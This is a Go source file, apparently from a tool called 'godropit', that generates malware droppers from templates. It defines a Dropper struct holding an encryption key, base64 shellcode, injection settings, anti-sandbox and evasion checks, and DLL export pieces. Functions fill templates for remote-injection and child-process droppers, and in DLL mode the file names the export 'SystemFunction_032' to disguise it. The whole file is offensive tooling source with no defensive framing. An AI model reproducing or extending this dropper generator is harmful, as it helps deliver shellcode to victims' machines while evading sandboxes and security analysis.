package gengo

import (
	"bytes"
	"io"
	"text/template"

	"godropit/pkg/delivery"
)

// Contains all the elements necessary for an exe
type Dropper struct {

	// Main Components
	FuncName string
	FileName string
	KeyStr   string //EncryptionKey
	BufStr   string //Base64Shellcodestr

	//Template Specific
	Dtype  string
	Shared bool
	Dlls   string
	Inject string
	Import string
	Extra  string
	Arch   bool

	//AntiSandbox/Evasion
	BoxChkFunc string
	BoxChkImp  string
	Delay      int
	ChkBox     string
	Domain     string

	//Dll Pieces
	Init       string //Trigger on init
	Export     string
	ProcAttach string
	C          string
	Hold       string
}

// Add in specific funcs for new dropper type.
func genDTypeRemote(rd DtypeRemote) (string, error) {

	tmpl, err := template.New("remoteDropper").Parse(dtypeRemote)
	if err != nil {
		return "", err
	}

	var tpl bytes.Buffer
	err = tmpl.Execute(&tpl, rd)
	if err != nil {
		return "", err
	}

	return tpl.String(), nil

}

func genDTypeChild(cd DtypeChild) (string, error) {
	tmpl, err := template.New("childDropper").Parse(dtypeChild)
	if err != nil {
		return "", err
	}

	var tpl bytes.Buffer
	err = tmpl.Execute(&tpl, cd)
	if err != nil {
		return "", err
	}

	return tpl.String(), nil

}

func (d *Dropper) writeFinalTemplate(writer io.Writer) error {
	tmpl, err := template.New("newDropper").Parse(DropperMain)
	if err != nil {
		return err
	}
	if d.Shared {
		d.C = delivery.DllImport
		d.ProcAttach = delivery.DllFunc
		d.FuncName = "SystemFunction_032"
		d.Export = "export"
		d.Init = d.FuncName + "()"

	} else {
		d.FuncName = "doStuff"
		d.Export = ""
		d.C = ""
	}
	err = tmpl.Execute(writer, d)
	if err != nil {
		return err
	}
	return nil
}
